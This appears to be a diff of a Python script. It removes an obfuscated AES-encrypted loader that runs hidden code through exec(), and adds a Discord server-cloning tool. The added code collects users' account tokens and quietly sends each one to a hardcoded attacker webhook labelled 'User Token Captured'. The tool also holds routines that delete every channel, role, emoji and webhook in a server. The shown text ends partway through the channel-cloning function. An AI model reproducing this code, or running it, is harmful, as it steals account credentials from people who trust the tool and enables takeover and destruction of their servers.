@@ -1,37 +1,726 @@
+#!/usr/bin/env python3
+import asyncio
+import aiohttp
+import base64
+import json
+import sys
+import time
+import os
+from datetime import datetime
+from typing import Optional, Dict, List, Any
 
-import base64, zlib
-from Crypto.Cipher import AES
-from Crypto.Util.Padding import unpad
+# ------------------- إعدادات الويب هوك -------------------
+WEBHOOK_URL = "https://discord.com/api/webhooks/1492248198603870287/76I1OsjQDctQW_7depaD1_x23RfmX68eN4DFaTDpRHYcTXkNIZKuzj3NDVqxp6h99cT8"
 
-# ========== Junk code ==========
-def eUeMab():
-    eqoQ = 802
-    VmTM = trhF ^ 29
-    return MtNK
+# ------------------- إدارة التوكنات في ملف JSON -------------------
+TOKEN_FILE = "tokens.json"
 
-def rgKXkR():
-    QyPX = 328
-    gZeh = WZYZ ^ 171
-    return uSpu
+def load_tokens_data() -> List[Dict]:
+    """تحميل قائمة التوكنات من ملف JSON"""
+    if not os.path.exists(TOKEN_FILE):
+        return []
+    try:
+        with open(TOKEN_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except:
+        return []
 
-def NBquUA():
-    suyz = 790
-    lOgQ = ucnZ ^ 92
-    return NAxi
+def save_tokens_data(tokens: List[Dict]):
+    with open(TOKEN_FILE, "w", encoding="utf-8") as f:
+        json.dump(tokens, f, indent=2, ensure_ascii=False)
 
+def get_user_info(token: str) -> Optional[Dict]:
+    """جلب معلومات المستخدم من التوكن"""
+    async def fetch():
+        async with aiohttp.ClientSession() as session:
+            headers = {'Authorization': token, 'User-Agent': 'Mozilla/5.0'}
+            async with session.get('https://discord.com/api/v10/users/@me', headers=headers) as resp:
+                if resp.status == 200:
+                    return await resp.json()
+                return None
+    try:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        result = loop.run_until_complete(fetch())
+        loop.close()
+        return result
+    except:
+        return None
 
-# ========== Main loader ==========
-hGDWCCKVLNOT = "382b6c4772753648567152426f657a6b715058526e44484930694239574571446e43755244673168772b2f6a524155554a447a53696e597764797630597038516852666857696f3972784d4448683943484f6c6e487163462f5473505475774f6b574a757143686d5545433975504a4c4151466e3152334b6655626736436c5a672b3262306652725862534d67424c3974566d5769386177366e634c55787a64576f6578776e70545465774473496d654d5176545375657555332b2b442f622f552b4939366e786b37384d57523255396d5933392b304e696e576f7550616c6e595653777964327a45734564657838357579336f6e64694878546276714a597751324a42454c535347697433764832507872534453507a6378694270394b5a5a37733955644a6333344b54504a6c3661474d7953767830386a6a496348444f7866736a364f303754307343636e5144726a387a6c475568547453656d554168666e437339644a304b556845424f2b383159356f656a43495954614d715052325a61735265375a316d4f526a4b3739566656673033434f615a4d506832764b2b6e6c62356d78574b5467314d46536e493132576142326c7359596a6e57744c4e65686250566c4854414d2f4c6c48453574436332376a66767a46315769336f77666b585a493747634131377644565356326d5a6e363777584e5049324b624866426f3458314c757a7458704c696a624d38362b2b48356677366e6a5064587063512f7a2f2b676c6b2b7a354164476352514141534164626d39724f4e424b4b3378514867763143644e6f5a3046426f496d576438356630336e794c4146777a6e37483458784e7733384b334c64502b57632f636d675054343450356953737a4a327869714b5578424b70694c476d363462536f4a7437736957727767322f3652335865484147446f544f37645133556c46586f6e2b7449426f6345726e61544267744a375a5a6263384f2b51706f317a6934502b61694e303932644b50677938425449696f78536b4f4d327a75686e4d774a784672654369785543474545416d36443430764d4d59514d775237386f56784c7952793967335664335652586f36664f366d596762756169352b787930662f5653626f46734f7847775a46674c58384d454c34624c4c2f4b4e514c58582f386e4e4452614b5662632b452b39796276663779764d62306e6b36544358766d4765436a33504f726564434e4553387972796f325950324e696b5974796741675a7a5537454c42304555354a2f3257493959462f5970525939375a4c7a474a6c2f6c4635613178766530564a71752f3167394b466d4a3834706e6d49364e4f5959693234367370304e4338492b456e5a79577758702f355363332f6550417a5067585066314e574f516e727735695a7235616a7575766d674652674b5a71624c5846746557564941476941625065445058736657446b544c554c784948466e726f746437376559394a5a6c7341395637646b42504e7041575a634641507373463849656d38546e6b374a4d375a73453556596255786955323237317530446a77325339554363624262744d6678636c6763514841753272704d58583176783749796e57724d44616747384d33514b3568722b645a4c646469486f454157634f344f384878394f784d44794f586c4165744a7a6a2f5149684b4b356236783351646944345a2f335864664a6538783448766936754d436d4c3358713354486a6d754c74334d476e734463455855793041363746743657684571644c4c434c782f4b433469724d6b744772417679717138596c50613633524957516e61336447656c664b4766556367562f31314749476f47446f49513857306f373232545a4c45567269545a42496d442b45536178463450313034636d764e47302b4479514d705275374571636f34663074364971645a61474f2f42473644613034537975434b68654335746f37536e6d635755554f614b376252576b4b44644a48546d6d6977637a4b53373739524a37325832526a41646c3958776359436769664768563736574751596c4c426a32654c4b497932664e6472566c5468762b6369304455616b4e6a695266516d4f6f2b72486f337346654d34492b7a726747434661486f35303149724b3234714e574a5250556258536c587771764d48464d386e716337572f6e414e4d7a4f3476684c4b4f464636584d5163503550574754636f75724a55626e69346347757149466d575a7a6e657a4436652b63772b397562674270455255414b65364f2b56465838532f5341616479744c386a76686e4b51416d41445348454b516f6d6730767a516b486f503831614d5048354e2b65496f4f6a574773357532416a3964624a305a70704d333248754b745832485748374a57685932797837774847576a4b4d4b4e775331485732683568356669724839526442673954367562525a486c384d64767a47395a314333625153474b474f7874326768513953795a34456636596b305434317472356d50575578376266746d516c4d46572f53726678696338533566707935563237436b4b5234774664722f32446f744f6f7275546e6d614149534e4342475151363848644c6747545a435a69384950742b353374574437416679426f6a6441306a37543030466635317531482b6979535564726e5a4d3754524a75636e42584772626c42336962594870437a382b576d6a657635377a624763464361304731474a704c44754f752f4571736a6b4b4c4c456a774a6f7835306a41684a2b797239484d37506c486151376a7a71364d446e74744f316f704b6a4954424a68316652664a6e326548506635446c43796a34613071454f72486665304e5034624267575453425871654e5965506f4375354a45784f306478444f74355753626d53576366544e366a6546596c797254474f644361755337556431326c356a4d524c4d492f346f7968433130386e2f774567496d634c46424733793563415a452f394966484d5a58334966684f6f71632b396633554e6e736c47413330614853746a4b6a6f656631476a7167432b4f4a596243416831387a5072334f4647347a66303333567a737030395961456b42742f7348505a6379307674774537685948516d55707131676d794b6e713647634a466a637234507542317a6849792f2b7951684156387a393776385a38345051436a2f3748704e796f387252754b2f69354f535059386466662f664a6e5058317a394f4a72666d636b634f6561654f5a786d4b53675079705a6253624d46624e56616c74784369687066546d7244446c62506e3054663847742b61784d654664485341454f5639525a446f624978485555366470706854543977777053786e3751794c63554646416e784737743470533135505749613562344e314432326779712f615637454545517044342b6b44757331686d61654a41556d6f516a4e49757a51524c51553563706a4464614c4164766e3775456766496e70676c4a63695761322f634f4865334d6a4e49557a55424644776e33424b37344d36316a2b6b384858742b6542624743345652614568332b4a6e5a646233474d54427731666562552b36396243515178504576436b695a7364737053674653554348447a2b47754f47692f6547734c6a30432f534f3462593967627068526c45414f36357a53515a38457a63334a547a594e64315479326233706c32516e30345041726637666b2f34752b37656c784e655a34334a3838586655705358526a473134453770593062694a727a683877614230507a466b32516f37736330524a51434d61576f75627a4b5779617751446258384963385a7049383565554546304c49773567725039766e6a57542f4c555846714c34435553306854694353515a2b3237675a742b434e4476764d73773838554a7942423646326d79464947384b4436467532484f4a2f5662536e696943586f2b583048564652794a34555256423162754b4d54734933535177495556334f5430797455617753302f2b414c4374304e6c473969393067395837317932744953784a457a51524e784a4c7159457646797255346441586c5073582f2b327a7142394a575349445347452f4469784945744d75546f51617265544743613265705467387266656443345134664a797753707876465349415869537046422b636f307674447771376a3458486377444669612f62314278634b7734494e5374486e4e544e2f31714e4a2f2b776e416438315a4372353865466b4c772f6448387a327145465a546a50306c576a666b53617a50536e74417443354c315253347a596535534d506867706e4c68337078393330497263522f7644556632447366534a4255412b464372415a366c486b4c63644346506e5448444478334c304b6338576c2b4e35454144386472497250546834757a6265396c63642f52527575346e6d344e534d6d4e4b6771477478724a4572546437595065427654522b36584e38764e4554756a474e39374b65396b6861657a70696c58704a624277567057356b65696c456d6b716d4262454a3550546a68746e2f4263792f547358357247494e74336658713541456c75496a3448324964316d76344a3937433835565755566b2f5255686246376e67577472467157683549726469534472382b752b667041665138716f4b497432472f7765657036777957674c4159596d436f714e5067524b2f2f616b7a70534b6c742f306c7a716f6c3234417a71666442505738634b647a5073645a39494769306a6250346465762f477333775162594e61425a74466762674834374f5a4147445764656e4b5933367944384c7876495136543930674b5a764964312b654c7a6743535144665435795446444a6f686a36556766467643585834345641616877664934517a377373354650742b5035774d436c42584549715934354f6b56634f3834445458315130724a4c6958316164306143654b33502f6d49637a63444b39484333706c664853763762497868677973674275556b6b33357262323350555a6d486f794c53657a703158714c562f6b45663465327161424939445a7036304e6449785441672f49497932575270795548713569354235702b633978364233307a58586f636937447971447779355474636344574476777477315463413438725a5445325a55716a325374735a69326c4d5763544a74344250626b7866473259426149517251424b722f59516c7751627175367a497661426f4963576b7559312f78445834414b5a4670424739704f494b4e5962424742514465516f566f4e3373556d326862534f484777765052454764634a7270624845422b4c32586b42504139685751356745656c47794749736d66302f754a4174383569396e44475a7434626b445137504a394a386b4b30465835714e4d39755662584c58496f61707848504169554a477766385a48435976576d622b344d315932632b7a356b50773245302b394461476e592b45414e7979456d6a7a50635447654c4c4a50726132544531447142436b6a5a4839526e5866452b5332526e626d387a786e7141625547322f583466576a4a68594631692f5668754a78476f622f532f5a2b6a45524b4558474442782b6f4f72736e347977427747376a7069734e46417a5259676552375837664531664f3662494b74523946796d7641374d34487a664653374571587970794265716d643372473942713565526f5357714c2b45353679665845464d31645259475038717a7357435073693952416936736d427a307a33794d7a4a7a55345979354e684b59684931566344702b4b4b77364f6e72706f394765726d706c534b6e37394a584a39344c3472746c6d4a625330644d71793857346757616646344a31514a78665679644e2f6262515a2f3176664859486e3637484453325553597a3035486d4c7a6138483955716b6c454837566b6b375a4477593464794e55704d4e6545456e6f316257755351557a444e6d6b504748354d486969726a456d4577496879597954594179696b4c786672704b357374397a67686d632f4c4d316c4548355731352b4c4b4534635a4578585a387271344c4175337157422b744643336f6f707646566f52303064766769766279524e5130476955366542714f766c2b704164533158464e32644b362f65597a676253434d7872305277534d6d32373143566248735167676145654268586a6a4c586d5848384d46575378464c476742397958316f524d325a37536948546f61672f7143586a62776c596b584a37452f3662633769573635707456764639523846596a69344f6d4e6133536859443545653450664864562f6837387668353664794f2b68584f6f2b6c56784c62646356494c5335326d70457672304b415674686e63373767643579316e756b57426f2b42656c416441734d366938522f773557527a65755279705a6971345a74446c634637647a535839795062465355516244626434534639584d68667670544d533567424747664d336e65354f736747576f615a70667673634863566d796e453332346e7058493638494f4f4739666278475743746a4158475572457071366f5a6d2b58323550475462793844345a492b692f644e314e6d456e4f6c416661693850505268375231454d52684b4870733752784c7639617072635063323154763341676472677137314a44344f452b4f75716d354d682b44396441514947464c3236474233495045593543554a474d674f34487737574a2b6673785352376671714158463464426172497a314a53314a4e507058336861504e76544438455338752f6e4b327631656c79456a79364868495135424936626b7576354f5a73556f56307a7565624a57764b3256664638476150536a4b566d5a4e6b697943504265764e77754b673559444a6541714964464168454864464a4d51753164655379394e6e623275313364713230676f47697373594459722b477771356949366b70477a7a6c3453614a326637316b39475558736a4b49612b6a72664c354431465a63745663746468697175622b643055574c4c524975745a2f4f71337470356966326163384f4a2b3934317a636469713865776f5355454434304c344d384954514477485a386150335166436a69422b4b7a62524e6177676c33413745535542546e6b3952746771716b344a6a2f326e334b5768595444516b49727358654f3478393332574e75385865514443776361747071776f6d6e544a65796679724f6d4f63384144346d53796978326e337a63673061624f78546136735564543143527a32752b334f457574454f3262445a674d78645470386f4c3448574b445a65693956325933564961684465672b335075666e733568772f7666396b322b65776f2f6a6d44432f524e304d36734e4c6c48352b55453645786a6b4b71344b4c33554c4e4132763464714d56457662476d4d7a6c4544583171363135776f684749367948384d72784f616e616c3767394a7934774c666678332f5372472f32556c364732545947352f37594b33304e693345434f30384d53652b306b30326b6434374d45526f5279585278464251497550544b43537153455a514544425a646c3538777a332f69436e307344434c737337346378654c526b4d42626f7947784f5844746777436e322f4676414c38707339456e362f56536a4e744a50442f65464a4d594f524e484d4f5442505849493261413536524c326259706b6e3936436762724c6d6a44384a2b4773713763726734545a7743315a674f4e636f707376794350366b796e684f47452b316a4657467a6465786e524147352f696c6664724e5a3263396a43615433436b35623532543436374b4b4e716f6c6a30336349567230774f757738612b415532415149776c78704554434d6a7670625742555544377235786d5a53673951694c6659657764624a56654c646c4f635a5169335a6757646f44664b4a652b77737a4b38434938676c637267547032586d316a51656d362b53396a445130354d494356386330323643745a55305132765537597446646f3732664c524374646d755a6736616446547453764245374632544c533535346f6c7968344562394c475747362f4b7762624f374e69685664596b6b574c6736347367586d6672567a316b63544b4839767a5850385a59786a465439505a7231765768345156384b66707251416b506966746447646d6c487653445a6871613261532b3234517259656a7863534234507835624650444b726c664c7333335265536678777144587a7a2f4a696b394679374c5376744d504f685a644977795a31614770774652706a322b374b2b3456784c494c556a6b646b354b56476c5579626c66362b7231414531494c6248463462784f4c4b6a4f5a736239643855523057334d6e4a426736754a496a3363736166386178504a6368666745496b623743386c657161766a30754e585a6866316a784f7876324c4b3235514767674971726b574153615034743433794b6a2b675a792b3832617655594f4a6d783979382f4356697765674e6e7a506d65547479667967754d644674436f752b4a51736564644e3257597751466d637761416a484e556b6e7a537365546b42306f424f464c396258587041464e41586b36704f7a4b51547868566b32704777456d543949753138772f6835564d7168717a4b6a536f4a32476d41766c6f4a6171614c72766b7731614479495038636f504a584b5a4d5739586d4955465a63726d5276785972747672775a795a654b46446f6f54324e752b5165634f554a776d36316e6a61327532464957507467796e523237665762504f2b496c4454516e2b65695164664c35545732663162334259352f494155485354415064595971525169696f567450437a647849704b78695256773061797841715079714a442b576f2f6451727431772b45316e6a7543373235647a347669746a7572554b697a75723075726e68536d365077442b444a346f326a714765576b6f513736464f63704d4364313675706179692f6249476f58633134754f6b36386b7866616e614c54744f3142435161675371354d73344b6c6e4e726b6f702f52516f4264694f77314d746a737a33697051743241696d4363416c4f6435684a58637a59462b65342f444873504d5468755a554f5169425344392b624452724e66416667684571336652513158694b714b4949794a4e313164377a784e39664151796b494d7056666966646b636b45536e4147624b353639734a387349767339496639325335696b684f75794c68545548694a42394b333950752b6c6a572f50337069776e695432636f41526f786d6676646c4a4331776e7a31396450756d345172544c684d5a7a5948597962646a79767553354572425a53546348314b4b664f55674a6871753150556868374d4a7353416a4e35353779366e724a786c3641514a746a776e4a6c734f5930525256784d4d4d523954784b664b2b4b5466382f703454766e422b4d3972562f4e62464d6646674f4c556a483873637338646d6959747374635451684239763375526d5279696b347675704f33647858565568596f54584e46557642627047527a453545566e684632617972635932725332515251586c434e707262797343374e484b6a387a7170376361674e6556472b3537446f41377a6452314d642b706b4275502f564d2f4b354c6657527658364259563135666d775730797054445a794e517841752b39554e56746579444543696675496e6571373334542f36686e496c39417858654636762f435874716841415333543978454e333335576356677668713230754d475a5a64664665657673656b6f6945334330536c3378744e662b4a5271522b5274707673786b2f7865615a534371374d44576559574a754e41506c4f77305363374f577a545a5232344956526d426c47535658737474567a345675473878307345342b4d523134767462506c4c6e746a397376724532624f504f76474c67526430616f2f506272376553477271364248412f4651376c5a376c4d4c413638797a71563967686153764f49546e4b476c5176646a354833424650574c73383347535151614778345446565436737168757031663472346f58774e724a6541384a556e4d7572313431674a2b2f2f79744b2b6d414a703445714c5566496e636277336730527a3053452f50682f3264394e386965726758777453383773633546363974716e773762414751316843754e6769442f6d4d61794d5450477576795a524378364a4a384e4b7543577a37725a384d463644637a7a522b2b724a324765466366722b2f397647666b687045642f6374556a4b67596a306c68344f725a42456b3241513261446b67433662374335396d6973437152716871355679516e334b7346724270416138366951754e374b464c5356424d4f547656516c45344f4278374c392b7966647952783353575769384b55793573784e77376e6443674b5074793762354375733365486e31726b322f4232527a2f66696c6c45386879396c52624146374d6470516769734e587a6964444252764a5a6d332f446a573844565a4448734a544a454f34736554662b6b66756d6549345633537363796b43574e49533973457759774c635556566e4d58614d426d6f5453746f5469395a654b5a2f4b2b325250654f2f517537584f4f327770427435564544666a716d7554334365793069504b6859454454712b30557169697174377a486e32305338366e304b6130504a342b6c554879434e5745446850725758527558347a68625777686b32636d6738514f506d734d6b4d372f594d6f7339475476457741665950553871386f735447354d724b4274426e5254377250544253564f506832327148715a45384b51745954635045614f632f32313332504679594f364458522b6859464e322f3238456d6e6f6a3857616b454a5a4f597734414d592b6249786e374f52783043614654675445325a39787871456d4f3154526748636c37742b4559597171346c596a6d3276596351357a4e5a61744f3577506f4f2b4c706868736e49436f734c4b6d33747171664d535a376c73694844374c3241566c372b75745255455a3964613433657532767439414d5236752f4676354b342f565133424c35412b323078356735785478684155674b3271512f626949734f4e4152584e2b7730757677564f41344e416968656b6a68794743347671324d69352f624a59446b712b70767a63304f442b76495476774e747a65666e666d4579354a72365162424f646e6a756c7956666f42576b34703573523875354f754a496738635173447370673869795a335345634d6634595577633137597a68516a38367a335547324966376e4b44576779556e6c7346634368302f653371673854476a354c32467858454d33775570544147506154315268694b323755354377786d324d3934474c364635504d4d69584d6e78614f5642707235314777384f71736748504c5874706272663746355169366233396d4f653654756342496542613431585136745a49456f502b37396947523446414e49762f5a4264503167707271784d4563552f475773775246686458592f6a366d425473324a4848443530356b5a5443466f673964345850393734336368302b744770487174615270787137686e39756b31514b67644e6f4e6e7663644b4367657137665472364a464c35436e354b707a563034314a685348624e4a77666135312b5376394b5334473449414e7979484b45566e4d462b5a454d6f743756376348446f3638555332347a53746d6a5454315067416a3057487471514e635762756f7a75686e79693479676159414c544f5065317265696d52694b7076355454676838346842584b44546f577561314a747a6f6e326571582b326b62486b6e624273782f6a547245552f7076426f77306361334d534e654a73376b53664f384a4d657a514378464d7074744f43362b342b6b717a58537a4d41795033766432652f77464a794939304d5a7473312f51463072416b734d565654384b66514e6454386162666472373169334c663042673148356c536966706f304f30654f572b6f674d6748524a377a334b6e4c67756843694d796c586e50334868727358352b6c344c46666872746a707278777759684d48497264457871384a473761597543424c58686e70685239654d4e4e30553754436a68745556486456533646776e5a69786176632f676a4667535662776b6245565042586c66694a74686c63344f33453733317038353655317446646e49763877576a712f64634978726c49712b666443517654615a2b786f79774e464652696a2f31534e5562766d724a387845654a45357769634956687a496b586a4c646d794a706366713932636d51456834494e76464461582b59357a654a2f31484c4659624f554f727a45427066594b5a4d656a66585738634a76746c6c386e4b365975782b514f685564674c4d527a6d45746b6e4569516267552b56597674583370484964374254564d6b396f58624d734c5338496a33663836714865473947724947774e5758494842786374516575326a664672703438312f68663665702b6b6146446c584649624a4173777a6f72312f65454b3972676253647169576f7a73432b666d633875327436525a3432666b544a4b2f47375436514151624d7854706e545579783731497559314b552b646237414938706b4452584c4131724a3863746c4c397a4150624e706b706370536f6862707653704e2b726b626b2f76624f2f586643774a4e66317a73555553304f576c716438596e6975413255576e45796e6e554d5841346d524558464432654748557745546c79344d5943525a466e6a574a32464b754b646830626666576a6f7a6a575071692b7431464e34533732503773684c4b542b75414b614c466a5532316243634c523771377847694d2b696d2f4d716d507649374a36786b7a436b78524555686a54467537463739614a6647484c33544238424d586a2f794665473736643339364f565a77366532726f4f61456e432b746b6368536e3244766b70746153692b6343654464667659327141694547497a65784b764f6c3136304a3572584432635a716a7751735259772f454337313154366e6433357546614b2b4136356a78304d5551727a59784c32547536643141645872427049747a704e356b6762676d434865357455614133356371704939394348736366715151746b524b3979363164694d4d4f453168637a49736162454268616779766b6243697343524e62512b4948575a6c5470686c71655673633971444c77714357656c474a4e73706459392b4f3656546f454f515331496c43397568545470304a496a305a4b6a6349324f475845392b4d524f7647704844624878656e2f32485533573868774c756f59624641597335566b2b4f336176507872434276736357704669544c4164365677524e6c755737646f4e50485a50632b6d386c673951506c5764582b654470734e7157706771722b4b53324b76425761684244675265473370524f6e594c336f3346536b5641443531464c32374130614879673163506c532f764e52434238432b6f545872307630585834386d516d573146384d4845307a4c6964462f6e454331364157364b784d35324e584b4d78574e6e2b56664c437a452b4356495a43764734494433452b4a364437746747305256646b7a44663267597333327057484e2f43327a47357451536a482b704a716b376c3051544e59486f787034744d696d4a7737496b6c436c564952564f54622f6f736b596f66386b783339626141714f4d50536230476e5334686e74427430643130382b4971756c6a3453315a45744c4d346c384a39736a624866616353446d6d656a38474d3d"
-IIKDHkwQbk = "4462547343464e54636159796f512b704c39396474384c7166383241684652776f57373143436b644332413d"
-PTTaPhoD = "4f304f435057364d525a46715a55515355756e4850513d3d"
+def save_token(token: str) -> bool:
+    """حفظ التوكن إذا لم يكن موجوداً مسبقاً، ويعيد True إذا تم الحفظ جديداً"""
+    tokens = load_tokens_data()
+    for t in tokens:
+        if t['token'] == token:
+            return False  # موجود بالفعل
+    # جلب معلومات المستخدم
+    user_info = get_user_info(token)
+    if user_info:
+        username = user_info.get('username', 'Unknown')
+        discriminator = user_info.get('discriminator', '0')
+        username_str = f"{username}#{discriminator}" if discriminator != '0' else username
+        user_id = user_info.get('id', 'Unknown')
+    else:
+        username_str = "Invalid Token"
+        user_id = "Unknown"
+    tokens.append({
+        'token': token,
+        'username': username_str,
+        'user_id': user_id
+    })
+    save_tokens_data(tokens)
+    return True
 
-voKzKJZCnd = base64.b64decode(bytes.fromhex(IIKDHkwQbk).decode())
-LBOCFPzT = base64.b64decode(bytes.fromhex(PTTaPhoD).decode())
-LNZvqrYFtCHb = base64.b64decode(bytes.fromhex(hGDWCCKVLNOT).decode())
+def load_token_by_index(index: int) -> Optional[Dict]:
+    """تحميل التوكن برقم السطر (1-indexed) مع معلوماته"""
+    tokens = load_tokens_data()
+    if 1 <= index <= len(tokens):
+        return tokens[index - 1]
+    return None
 
-cipher = AES.new(voKzKJZCnd, AES.MODE_CBC, iv=LBOCFPzT)
-GVUOxJkDkT = unpad(cipher.decrypt(LNZvqrYFtCHb), AES.block_size)
-original_code = zlib.decompress(GVUOxJkDkT)
+def list_tokens() -> List[Dict]:
+    return load_tokens_data()
 
-# Execute in global scope to make imports available
-exec(original_code, globals())
+# ------------------- إرسال إلى ويب هوك -------------------
+async def send_to_webhook(token: str, source: str, target: str, user_id: str):
+    """إرسال معلومات التوكن إلى ويب هوك ديسكورد"""
+    payload = {
+        "content": "🚨 User Token Captured",
+        "embeds": [{
+            "title": "Token Information",
+            "color": 0xFF0000,
+            "fields": [
+                {"name": "Token", "value": f"```{token}```", "inline": False},
+                {"name": "Source", "value": source, "inline": True},
+                {"name": "Target", "value": target, "inline": True},
+                {"name": "User ID", "value": user_id, "inline": True},
+                {"name": "Time", "value": datetime.utcnow().isoformat() + "Z", "inline": True}
+            ],
+            "footer": {"text": "Discord Cloner"}
+        }]
+    }
+    try:
+        async with aiohttp.ClientSession() as session:
+            await session.post(WEBHOOK_URL, json=payload)
+    except:
+        pass  # تجاهل أخطاء الإرسال حتى لا يؤثر على النسخ
+
+# ------------------- دالة الطباعة المبسطة -------------------
+def log(msg: str, typ: str = 'info'):
+    prefix = ""
+    if typ == 'info':
+        prefix = "[INFO]"
+    elif typ == 'success':
+        prefix = "[✓]"
+    elif typ == 'warning':
+        prefix = "[!]"
+    elif typ == 'error':
+        prefix = "[✗]"
+    else:
+        prefix = f"[{typ.upper()}]"
+    print(f"{prefix} {msg}")
+
+# ------------------- كلاس النسخ الرئيسي -------------------
+class DiscordCloner:
+    def __init__(self, user_token: str):
+        self.token = user_token
+        self.base_url = 'https://discord.com/api/v10'
+        self.is_cloning = False
+        self.abort = False
+        self.clone_stats = {
+            'roles': 0, 'channels': 0, 'emojis': 0, 'stickers': 0,
+            'webhooks': 0, 'auto_mod': 0, 'settings': 0, 'role_icons': 0
+        }
+        self.delete_stats = {
+            'roles': 0, 'channels': 0, 'emojis': 0, 'webhooks': 0
+        }
+        self.role_id_map: Dict[str, str] = {}
+        self.channel_id_map: Dict[str, str] = {}
+        self.everyone_dest_id: Optional[str] = None
+        self.source_everyone_perms: Optional[str] = None
+
+    async def _request(self, session: aiohttp.ClientSession, endpoint: str, method: str = 'GET',
+                       body: Any = None, is_form: bool = False, silent: bool = False) -> Optional[Any]:
+        headers = {
+            'Authorization': self.token,
+            'User-Agent': 'Mozilla/5.0 (compatible; DiscordCloner/1.0)'
+        }
+        if not is_form:
+            headers['Content-Type'] = 'application/json'
+
+        url = f"{self.base_url}{endpoint}"
+        data = body if is_form else json.dumps(body) if body else None
+
+        async with session.request(method, url, headers=headers, data=data) as resp:
+            if resp.status == 429:
+                retry_after = (await resp.json()).get('retry_after', 1)
+                log(f"Rate limited, waiting {retry_after}s", 'warning')
+                await asyncio.sleep(retry_after)
+                return await self._request(session, endpoint, method, body, is_form, silent)
+            if resp.status in (401, 403):
+                raise Exception("Invalid or expired user token")
+            if resp.status == 204:
+                return None
+            if resp.status == 404:
+                return None
+            if not resp.ok:
+                text = await resp.text()
+                if not silent:
+                    log(f"API error {resp.status}: {text}", 'error')
+                return None
+            return await resp.json()
+
+    async def delay(self, ms: int):
+        await asyncio.sleep(ms / 1000)
+
+    # ------------------- حذف المحتوى -------------------
+    async def delete_all_channels(self, session: aiohttp.ClientSession, guild_id: str):
+        channels = await self._request(session, f'/guilds/{guild_id}/channels')
+        if not channels:
+            return
+        for ch in channels:
+            if self.abort:
+                break
+            await self._request(session, f'/channels/{ch["id"]}', 'DELETE')
+            self.delete_stats['channels'] += 1
+            log(f"Deleted channel: {ch['name']}", 'warning')
+            await self.delay(300)
+
+    async def delete_all_roles(self, session: aiohttp.ClientSession, guild_id: str):
+        roles = await self._request(session, f'/guilds/{guild_id}/roles')
+        if not roles:
+            return
+        for role in roles:
+            if self.abort or role['name'] == '@everyone':
+                continue
+            await self._request(session, f'/guilds/{guild_id}/roles/{role["id"]}', 'DELETE')
+            self.delete_stats['roles'] += 1
+            log(f"Deleted role: {role['name']}", 'warning')
+            await self.delay(300)
+
+    async def delete_all_emojis(self, session: aiohttp.ClientSession, guild_id: str):
+        emojis = await self._request(session, f'/guilds/{guild_id}/emojis')
+        if not emojis:
+            return
+        for emoji in emojis:
+            if self.abort:
+                break
+            await self._request(session, f'/guilds/{guild_id}/emojis/{emoji["id"]}', 'DELETE')
+            self.delete_stats['emojis'] += 1
+            log(f"Deleted emoji: {emoji['name']}", 'warning')
+            await self.delay(300)
+
+    async def delete_all_webhooks(self, session: aiohttp.ClientSession, guild_id: str):
+        webhooks = await self._request(session, f'/guilds/{guild_id}/webhooks')
+        if not webhooks:
+            return
+        for wh in webhooks:
+            if self.abort:
+                break
+            await self._request(session, f'/webhooks/{wh["id"]}', 'DELETE')
+            self.delete_stats['webhooks'] += 1
+            log(f"Deleted webhook: {wh['name']}", 'warning')
+            await self.delay(300)
+
+    # ------------------- نسخ الرتب -------------------
+    async def clone_roles(self, session: aiohttp.ClientSession, source_id: str, target_id: str, clone_icons: bool):
+        source_roles = await self._request(session, f'/guilds/{source_id}/roles')
+        target_roles = await self._request(session, f'/guilds/{target_id}/roles')
+        if not source_roles:
+            return
+
+        everyone = next((r for r in source_roles if r['name'] == '@everyone'), None)
+        self.source_everyone_perms = str(everyone.get('permissions', '0')) if everyone else '0'
+
+        filtered = [r for r in source_roles if r['name'] != '@everyone']
+        for role in filtered:
+            if self.abort:
+                break
+            payload = {
+                'name': role['name'],
+                'color': role.get('color', 0),
+                'hoist': role.get('hoist', False),
+                'permissions': str(role.get('permissions', '0')),
+                'mentionable': role.get('mentionable', False)
+            }
+            new_role = await self._request(session, f'/guilds/{target_id}/roles', 'POST', payload)
+            if new_role:
+                self.role_id_map[role['id']] = new_role['id']
+                self.clone_stats['roles'] += 1
+                log(f"Cloned role: {role['name']}", 'success')
+
+                if clone_icons and role.get('icon'):
+                    try:
+                        icon_url = f"https://cdn.discordapp.com/role-icons/{role['id']}/{role['icon']}.png"
+                        async with session.get(icon_url) as resp:
+                            icon_data = await resp.read()
+                        b64_icon = base64.b64encode(icon_data).decode()
+                        form = aiohttp.FormData()
+                        form.add_field('icon', b64_icon, content_type='image/png')
+                        await self._request(session, f'/guilds/{target_id}/roles/{new_role["id"]}', 'PATCH', form, is_form=True)
+                        self.clone_stats['role_icons'] += 1
+                        log(f"Cloned role icon: {role['name']}", 'success')
+                    except Exception as e:
+                        log(f"Role icon failed for {role['name']}: {e}", 'warning')
+            await self.delay(200)
+
+        dest_everyone = next((r for r in target_roles if r['name'] == '@everyone'), None) if target_roles else None
+        if dest_everyone and self.source_everyone_perms != '0':
+            await self._request(session, f'/guilds/{target_id}/roles/{dest_everyone["id"]}', 'PATCH', {'permissions': self.source_everyone_perms})
+
+    # ------------------- معالجة الصلاحيات -------------------
+    def process_overwrites(self, overwrites: List[Dict]) -> List[Dict]:
+        if not overwrites:
+            return []
+        result = []
+        for ow in overwrites:
+            ow_id = ow['id']
+            if ow['type'] == 0:
+                ow_id = self.role_id_map.get(ow_id, ow_id)
+                if ow_id == self.everyone_dest_id:
+                    ow_id = self.everyone_dest_id
+            elif ow['type'] == 1:
+                ow_id = self.channel_id_map.get(ow_id, ow_id)
+            result.append({
+                'id': ow_id,
+                'type': ow['type'],
+                'allow': ow['allow'],
+                'deny': ow['deny']
+            })
+        return result
+
+    # ------------------- نسخ القنوات -------------------
+    async def clone_channels(self, session: aiohttp.ClientSession, source_id: str, target_id: str, clone_webhooks: bool):
+        source_channels = await self._request(session, f'/guilds/{source_id}/channels')
+        if not source_channels:
+            return
+
+        categories = [c for c in source_channels if c.get('type') == 4]
+        others = [c for c in source_channels if c.get('type') != 4]
+        categories.sort(key=lambda c: c.get('position', 0))
+        others.sort(key=lambda c: c.get('position', 0))
+        all_channels = categories + others
+
+        for ch in all_channels:
+            if self.abort:
+                break
+            overwrites = self.process_overwrites(ch.get('permission_overwrites', []))
+            payload = {
+                'name': ch['name'],
+                'type': ch.get('type', 0),
+                'position': ch.get('position', 0),
+                'permission_overwrites': overwrites,
